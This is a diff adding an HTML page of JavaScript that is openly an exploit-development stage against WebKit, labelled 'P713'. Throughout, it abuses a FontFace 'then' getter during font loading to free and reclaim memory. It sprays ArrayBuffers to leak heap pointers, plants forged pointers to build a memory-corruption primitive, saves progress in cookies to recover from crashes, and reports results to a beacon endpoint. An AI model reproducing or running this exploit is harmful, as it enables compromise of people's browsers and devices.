@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P713 — ArrayBuffer Overlap & Controlled Dereference Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P713 — ArrayBuffer Overlap & Controlled Dereference Scout
+ *
+ * Ground Truth from P712:
+ * - Reclaim q12=P58 + q6=P58 completed with nz=14 without crashing.
+ * - WebKit wrote:
+ *     q0  = 0x1 (RefCount)
+ *     q11 = P58 + 0xF00 (3,840 bytes away in fastMalloc!)
+ *     q12 = 0x2000000000 (m_capacity)
+ *     q13 = WeakPtr
+ *
+ * Objectives of P713:
+ * 1. Spray 64 recognizable ArrayBuffers (192 bytes each) right next to P58.
+ * 2. Point q6 to adjacent ArrayBuffer slots: target = P58 + (k * 192).
+ * 3. When WebKit processes font resolution, it dereferences q6 into our
+ *    controlled ArrayBuffer!
+ * 4. Scan all 64 ArrayBuffers: find the one that WebKit interacted with.
+ * 5. Discovering an overlapping ArrayBuffer establishes the bidirectional
+ *    ArrayBuffer <-> WebKit internal memory corruption primitive!
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P713-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+/* ---- Cookie Helpers for Crash Recovery ---- */
+function getCookie(name){
+  var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
+  return match ? decodeURIComponent(match[1]) : null;
+}
+function setCookie(name, val){
+  document.cookie = name + '=' + encodeURIComponent(val) + '; path=/; max-age=3600';
+}
+function clearCookie(name){
+  document.cookie = name + '=; path=/; max-age=0';
+}
+
+var P58 = null, P68 = null;
+var SPRAY_ABS = [];
+var DELTA_CANDIDATES = [0, 192, 768, 960, 1152, 1344, 1536, 1728, 1920, 3840];
+var DELTA_IDX = 0;
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+function run(){
+  b('BOOT','p713-overlap-scout');
+  log('=== P713 ArrayBuffer Overlap Scout ===\n');
+
+  /* Crash recovery check */
+  var lastDelta = getCookie('p713_last_delta');
+  var savedIdx = parseInt(getCookie('p713_delta_idx') || '0', 10);
+  if(isNaN(savedIdx) || savedIdx >= DELTA_CANDIDATES.length) savedIdx = 0;
+
+  if(lastDelta !== null){
+    b('DELTA-CRASH', 'delta=' + lastDelta + '|advancingToIdx=' + savedIdx);
+    log('Previous crash on delta ' + lastDelta + '. Advancing to index ' + savedIdx);
+    clearCookie('p713_last_delta');
+  }
+
+  DELTA_IDX = savedIdx;
+
+  if(DELTA_IDX >= DELTA_CANDIDATES.length){
+    b('ALL-COMPLETE','deltas-exhausted');
+    log('All delta candidates tested.');
+    clearCookie('p713_delta_idx');
+    return;
+  }
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Spray recognized target ArrayBuffers */
+    log('[Step 2] Spraying 64 patterned target ArrayBuffers...');
+    sprayTargetBuffers();
+
+    /* Step 3: Test current delta candidate */
+    testDeltaCandidate();
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Spray Target Buffers ---- */
+function sprayTargetBuffers(){
+  SPRAY_ABS = [];
+  for(var i=0; i<64; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    /* Magic pattern: 0xDEADBEEF00000000 | (idx << 16) | qword */
+    for(var q=0; q<24; q++){
+      v[q] = BigInt('0xDEADBEEF00000000') | (BigInt(i) << 16n) | BigInt(q);
+    }
+    SPRAY_ABS.push(ab);
+  }
+  log('Sprayed 64 buffers with magic 0xDEADBEEF pattern.');
+}
+
+/* ---- Step 3: Test Delta Candidate ---- */
+function testDeltaCandidate(){
+  if(DELTA_IDX >= DELTA_CANDIDATES.length){
+    b('DONE','all-deltas-complete');
+    log('\n=== P713 Complete! ===');
+    clearCookie('p713_delta_idx');
+    clearCookie('p713_last_delta');
+    return;
+  }
+
+  var delta = DELTA_CANDIDATES[DELTA_IDX];
+  var targetQ6 = (delta >= 0) ? (P58 + BigInt(delta)) : (P58 - BigInt(-delta));
+
+  log('[Testing] Delta: ' + delta + ' bytes (Target q6: 0x' + h16(targetQ6) + ')...');
+
+  /* Store crash cookies before execution */
+  setCookie('p713_delta_idx', DELTA_IDX + 1);
+  setCookie('p713_last_delta', delta);
+
+  b('DELTA-PRE-TRY', 'delta=' + delta + '|target_q6=0x' + h16(targetQ6) + '|idx=' + DELTA_IDX);
+
+  var stD = document.createElement('style');
+  stD.textContent = '@font-face{font-family:df' + DELTA_IDX + ';src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stD);
+
+  var faceD = new FontFace('fdf' + DELTA_IDX, 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(faceD);
+  void faceD.loaded;
+
+  var absD = [], firedD = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedD) return undefined; firedD = true;
+      if(stD){ stD.remove(); stD.textContent = ''; stD = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;       /* Anchor q12 at P58 */
+        view[6]  = targetQ6;  /* Point q6 to target offset */
+        absD.push(ab);
+      }
+      try{ document.fonts.check('1em df' + DELTA_IDX); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em fdf' + DELTA_IDX + ', df' + DELTA_IDX, 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Survived without crashing! Clear the crash cookie */
+    clearCookie('p713_last_delta');
+
+    /* Scan all 64 sprayed ArrayBuffers for changes */
+    var overlapFound = false;
+    var overlapDetails = [];
+
+    for(var i=0; i<SPRAY_ABS.length; i++){
+      var v = new BigUint64Array(SPRAY_ABS[i]);
+      for(var q=0; q<24; q++){
+        var exp = BigInt('0xDEADBEEF00000000') | (BigInt(i) << 16n) | BigInt(q);
+        if(v[q] !== exp){
+          overlapFound = true;
+          overlapDetails.push('buf' + i + '[q' + q + ']=0x' + h16(v[q]));
+        }
+      }
+    }
+
+    if(overlapFound){
+      b('OVERLAP-HIT', 'delta=' + delta + '|details=' + overlapDetails.join(','));
+      log('🔥 OVERLAP HIT FOUND on delta ' + delta + '! ' + overlapDetails.join(', '));
+    } else {
+      b('DELTA-SURVIVED', 'delta=' + delta + '|overlap=none');
+      log('Delta ' + delta + ' survived (no overlap modified).');
+    }
+
+    /* Advance to next delta */
+    DELTA_IDX++;
+    setTimeout(testDeltaCandidate, 250);
+  }, 400);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P713 — Initializing ArrayBuffer Overlap Scout...</pre></body></html>
